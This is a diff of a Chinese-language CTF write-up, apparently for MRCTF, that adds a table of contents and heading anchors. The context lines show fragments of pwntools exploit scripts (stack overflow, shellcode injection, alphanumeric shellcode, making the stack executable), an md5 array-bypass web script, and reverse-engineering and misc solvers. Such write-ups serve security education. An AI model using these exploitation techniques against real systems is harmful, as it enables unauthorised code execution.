@@ -1,6 +1,29 @@
-[TOC]
-# PWN
-## easyoverflow
+- [ PWN](#head1)
+	- [ easyoverflow](#head2)
+	- [ shellcode](#head3)
+	- [ Easy_equation](#head4)
+	- [shellcode Revenge](#head5)
+	- [ nothing_but_everything](#head6)
+- [ web](#head7)
+	- [ ez_bypass](#head8)
+- [ RE](#head9)
+	- [ Transform](#head10)
+	- [ 撸啊撸](#head11)
+	- [ PixelShooter](#head12)
+	- [ hello_world_go](#head13)
+	- [ Hard-to-go](#head14)
+	- [ Shit](#head15)
+	- [ EasyCpp](#head16)
+- [ Crypto](#head17)
+	- [ 天干地支+甲子](#head18)
+	- [ Keyboard](#head19)
+- [ Misc](#head20)
+	- [ 千层套路](#head21)
+	- [ CyberPunk](#head22)
+	- [ Ezmisc](#head23)
+	- [ 你能看懂音符吗](#head24)
+# <span id="head1"> PWN</span>
+## <span id="head2"> easyoverflow</span>
 简单栈溢出exp.py
 ```
 #coding:utf8
@@ -17,7 +40,7 @@ sh.sendline(payload)
 sh.interactive()
 
 ```
-## shellcode
+## <span id="head3"> shellcode</span>
 直接用pwntools自带的shellcode
 ```
 #coding:utf8
@@ -29,7 +52,7 @@ sh.sendline(asm(shellcraft.amd64.linux.sh(),arch='amd64'))
 
 sh.interactive()
 ```
-## Easy_equation
+## <span id="head4"> Easy_equation</span>
 直接覆盖返回地址
 ```
 #coding:utf8
@@ -44,7 +67,7 @@ sh.sendline(payload)
 sh.interactive()
 
 ```
-## shellcode Revenge
+## <span id="head5">shellcode Revenge</span>
 限制字符范围为ascii可见字符，我们可以用谷歌的ALPHA3工具加密shellcode为存ascii字符shellcode即可。
 ```
 #coding:utf8
@@ -59,7 +82,7 @@ sh.send(payload)
 
 sh.interactive()
 ```
-## nothing_but_everything
+## <span id="head6"> nothing_but_everything</span>
 去掉了符号，我们可以写一个简易的程序静态编译后与该二进制进行对比，推断出某些函数的地址。我们找到_dl_make_stack_executable函数后，调用它，让栈变得可执行，然后jmp rsp执行shellcode。
 ```
 #coding:utf8
@@ -92,8 +115,8 @@ sh.sendline(payload)
 
 sh.interactive()
 ```
-# web
-## ez_bypass
+# <span id="head7"> web</span>
+## <span id="head8"> ez_bypass</span>
 利用数组类型，使得md5返回null，绕过。ez_bypass.py
 ```
 #coding:utf-8
@@ -112,8 +135,8 @@ result = opener.open(req)
 a=result.read() 
 print a
 ```
-# RE
-## Transform
+# <span id="head9"> RE</span>
+## <span id="head10"> Transform</span>
 ```
 #include <stdio.h>
 #include <stdlib.h>
@@ -141,7 +164,7 @@ int main() {
 	return 0;
 }
 ```
-## 撸啊撸
+## <span id="head11"> 撸啊撸</span>
 ```
 #include <iostream>
 
@@ -163,9 +186,9 @@ int main() {
 	return 0;
 }
 ```
-## PixelShooter
+## <span id="head12"> PixelShooter</span>
 直接用CSharpDecompile查看Assembly-CSharp.dll文件，即可发现flag。
-## hello_world_go
+## <span id="head13"> hello_world_go</span>
 直接用IDA打开，执行golang_loader_assist.py脚本，即可恢复符号，然后可以再查看一下主函数，可以发现flag。
 ##Junk
 逆向出逻辑如下
@@ -294,7 +317,7 @@ ok:
 	return 0;
 }
 ```
-## Hard-to-go
+## <span id="head14"> Hard-to-go</span>
 还是先用golang_loader_assist.py脚本恢复符号，然后分析，发现是rc4加密，写出逆向算法。
 ```
 from Crypto.Cipher import ARC4
@@ -308,7 +331,7 @@ def decodeRC4(data,key):
 data = '\x7D\x30\x6E\xC9\xCC\x03\x93\x1E\x85\x4D\x45\x5F\xC5\x46\xF4\xA8\xA0\x3E\x11\xBE\x70\x75\x1D\xA3\xCD\x7F\xFF\xBD\x81\x12\x00'
 print decodeRC4(data,'MRCTF_GOGOGO')
 ```
-## Shit
+## <span id="head15"> Shit</span>
 用IDA调试时发现一直运行，后来把initterm给nop掉，可以调试了，写好逆向算法后发现结果不对。原来key值跟是否调试有关，发现ollydbg可以直接调试，不会被检测到，于是利用ollydbg，获得key的数据，然后写出逆向算法。
 加密逻辑
 ```
@@ -431,7 +454,7 @@ int main() {
 	return 0;
 }
 ```
-## EasyCpp
+## <span id="head16"> EasyCpp</span>
 ```
 #include <iostream>
 #include <cmath>
@@ -516,13 +539,13 @@ int main() {
 	return 0;
 }
 ```
-# Crypto
-## 天干地支+甲子
+# <span id="head17"> Crypto</span>
+## <span id="head18"> 天干地支+甲子</span>
 对照天干地支表对应的数字与一个甲子(60)相加，得到数值，转成ascii即可。
-## Keyboard
+## <span id="head19"> Keyboard</span>
 9宫格键盘，对应的数字代表对应的按键，数字次数代表字母的位置。
-# Misc
-## 千层套路
+# <span id="head20"> Misc</span>
+## <span id="head21"> 千层套路</span>
 套了1千个压缩包，用python解压
 ```
 import zipfile
@@ -567,9 +590,9 @@ for line in content:
 img.save("qr.png")
 ```
 得到二维码，扫描即可。
-## CyberPunk
+## <span id="head22"> CyberPunk</span>
 用UPXEasyGUI工具一键脱壳，然后用IDA查看exe文件，得到flag。
-## Ezmisc
+## <span id="head23"> Ezmisc</span>
 用十六进制编辑器修改图片高度，打开图片，出现flag。
-## 你能看懂音符吗
+## <span id="head24"> 你能看懂音符吗</span>
 压缩包头文件有问题，用十六进制编辑器把头aRr改成Rar，然后解压，得到一个word文档，打开后发现没有内容，打开word的设置，勾选隐藏内容，出现音符，复制音符，使用在线音符解密，得到flag。
